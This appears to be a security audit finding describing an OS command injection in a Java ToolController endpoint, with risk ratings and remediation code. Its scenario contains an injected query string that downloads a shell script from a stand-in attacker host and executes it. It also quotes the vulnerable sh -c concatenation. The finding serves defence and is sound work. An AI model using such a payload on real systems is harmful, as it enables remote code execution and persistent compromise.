  title: OS Command Injection (ToolController.java:18)
  affected_parameter: name
  scenario: 'An attacker sends GET /api/tools/lookup?name=foo;curl+-o+/app/backdoor.sh+http://evil.example.com/shell.sh;bash+/app/backdoor.sh.
    ToolController.lookup() at line 18 passes the name parameter into a shell string: new String[]{"sh", "-c", "echo Result
    for " + name}. The semicolons delimit additional shell commands, giving the attacker arbitrary code execution in the shell.
    Because the Dockerfile runs the application as root with world-writable /app, the attacker can write files, install tools,
    and establish persistent access. The endpoint is publicly accessible per SecurityConfig.java:37.'
  evidence_summary: ToolController.lookup() at line 18 builds the shell command by string-concatenating the user-supplied
    name parameter into 'echo Result for ' + name and passes it to sh -c, enabling arbitrary shell expansion.
  impact_description: An unauthenticated attacker achieves arbitrary OS command execution as the root user inside the container,
    with the ability to read secrets, write files, and open reverse shells.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None. The endpoint requires no authentication. Input is not validated or sanitised before shell execution.
  mitigation_title: Eliminate shell interpolation in ToolController by passing arguments as discrete array elements
  remediation:
    effort: Low
    steps:
    - 'Replace sh -c string interpolation with a parameterised exec call: pass each argument as a separate element in the
      String array (e.g. new String[]{"lookup-tool", name}) and use ProcessBuilder with a validated name from an allowlist
      of known tool identifiers.'
    - Validate name against an explicit allowlist before invoking any external process; reject any value that does not match
      the expected identifier pattern.
    - 'Drop OS-level privilege: remove USER root from the Dockerfile and run the JVM as a non-root UID (e.g. UID 1000) to
      limit blast radius.'
    - If the lookup functionality only needs to return static results, eliminate the exec call entirely and serve results
      from an in-memory map.
    code_example: "// Before (ToolController.java:18): sh -c with string concatenation\nProcess process = Runtime.getRuntime().exec(new\
      \ String[]{\"sh\", \"-c\", \"echo Result for \" + name});\n\n// After: ProcessBuilder with allowlist validation\nprivate\
      \ static final Set<String> ALLOWED_TOOLS = Set.of(\"dig\", \"nslookup\", \"ping\");\n\nif (!ALLOWED_TOOLS.contains(name))\
      \ {\n    throw new ResponseStatusException(HttpStatus.BAD_REQUEST, \"Unknown tool\");\n}\nProcess process = new ProcessBuilder(\"\
      lookup-wrapper\", name)\n    .redirectErrorStream(true)\n    .start();"
